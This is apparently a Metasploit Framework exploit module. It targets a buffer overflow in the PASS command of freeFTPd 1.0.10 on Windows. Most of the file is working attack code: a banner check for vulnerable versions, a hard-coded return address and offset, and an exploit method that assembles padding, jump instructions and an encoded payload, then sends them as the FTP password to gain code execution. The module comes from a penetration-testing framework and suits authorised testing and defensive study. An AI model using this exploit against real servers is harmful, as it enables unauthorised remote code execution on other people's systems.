##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking 

  include Msf::Exploit::Remote::Ftp

  def initialize(info={})
    super(update_info(info,
      'Name'           => "freeFTPd 1.0.10 (PASS Command)",
      'Description'    => %q{
        freeFTPd contains an overflow condition that is triggered as user-supplied input
        is not properly validated when handling a specially crafted PASS command. This
        may allow a remote attacker to cause a buffer overflow, resulting in a denial of
        service or potentially allowing the execution of arbitrary code.

        FreeFTPd must have account authorization anonymous user account enabled.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Wireghoul', # Vulnerability discovery
          'TecR0c <roccogiovannicalvi[at]gmail.com>', # Metasploit module
        ],
      'References'     =>
        [
          ['OSVDB', '96517'],
          ['EDB',   '27747'],
          ['BID',   '61905']
        ],
      'Payload'        =>
        {
          'BadChars'   => "\x00\x0a\x0d",
        },
      'Platform'       => 'win',
      'Arch'           => 'ARCH_X86',
      'Targets'        =>
        [
          ['freeFTPd 10.0.10 on Windows (universal)',
            {
              'Ret'    => 0x004142f0, # pop ebp # pop ebx # ret 0x04 [FreeFTPDService.exe]
              'Offset' => 801,
            }
          ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Aug 20 2013",
      'DefaultTarget'  => 0))

    register_options([
      OptString.new('FTPUSER', [ true, 'The username to authenticate with', 'anonymous' ]),

    ], self.class)

    # We're triggering the bug via the PASS command, no point to have pass as configurable
    # option.
    deregister_options('FTPPASS')

  end

  def check

    connect
    disconnect

    # All versions including and above version 1.0 report
    # "220 Hello, I'm freeFTPd 1.0" when banner grabbing
    if banner =~ /freeFTPd 1.0/
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Safe

    end
  end

  def exploit

    connect
    print_status("Trying target #{target.name} with user #{user()}...")

    off = target['Offset'] - 9 # 9 => length of jump to get back to sc

    bof = payload.encoded
    bof << rand_text(off - payload.encoded.length)
    bof << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + off.to_s).encode_string
    bof << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-5").encode_string
    bof << rand_text(2)
    bof << [target.ret].pack('V')

    send_user(datastore['FTPUSER'])
    send_pass(bof)

  end
end
